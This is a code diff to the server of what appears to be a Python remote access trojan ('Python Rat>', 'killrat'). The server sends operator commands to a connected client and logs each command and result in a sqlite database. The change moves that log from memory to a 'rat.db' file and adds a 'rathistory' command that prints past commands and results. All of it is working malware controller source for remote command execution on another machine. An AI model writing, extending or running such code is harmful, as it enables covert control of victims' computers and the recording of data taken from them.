@@ -24,7 +24,7 @@ class SERVER:
         make_connection()
             Listen for the client
         make_db()
-            Create a sqlite3 database in memory for storing commands and results
+            Create a sqlite3 database for storing commands and results
         execute()
             Send commands to the client when the client requests them.
     """
@@ -63,15 +63,14 @@ class SERVER:
 
     def make_db(db_file):
         """
-        Create a sqlite3 database in memory for storing commands and results
+        Create a sqlite3 database for storing commands and results
         """
-        db = sqlite3.connect('file:rat_db?mode=memory&cache=shared') #If you wanted a local file database instead of in memory you could connect to a local database file like connect(rat_db.db)
+        db = sqlite3.connect('rat.db')
         cur = db.cursor()
         cur.execute("DROP TABLE IF EXISTS COMMANDS")
         db.commit()
         cur.execute('''CREATE TABLE COMMANDS(TIME TEXT PRIMARY KEY, COMMAND TEXT, RESULT TEXT);''')
         db.commit()
-        print("Database created in memory")
         db.close()
 
     def execute(self):
@@ -91,18 +90,28 @@ class SERVER:
                         connection.sendall(command.encode())
                         print("Closing Rat")
                         return;
-                        
-                    connection.sendall(command.encode()) #Send command
                     
+                    if command == "rathistory": #If user asks for the command history, give them the database and wait for their next command before sending it to the client
+                        db = sqlite3.connect('rat.db')
+                        cur = db.cursor()
+                        for row in cur.execute("SELECT * FROM COMMANDS"):
+                            print(row)
+                        command = input("Python Rat>") # Replacement command to retain communication order
+                        if command == "killrat": #Killrat command closes the program
+                            connection.sendall(command.encode())
+                            print("Closing Rat")
+                            return;
+
+                    connection.sendall(command.encode()) #Send command
+                        
                     result = connection.recv(1024).decode('utf-8')
 
-                    db = sqlite3.connect('file:rat_db?mode=memory&cache=shared')
+                    db = sqlite3.connect('rat.db')
                     cur = db.cursor()
                     cur.execute("INSERT INTO COMMANDS(TIME, COMMAND, RESULT) VALUES (?, ?, ?)", (str(datetime.datetime.now()), command, result)) #Send command and result to db
                     db.commit()
                     db.close()
                     print(result)
-                    print("Saved to DB")
                     connection.sendall("ack".encode())
 
 if __name__ == "__main__":
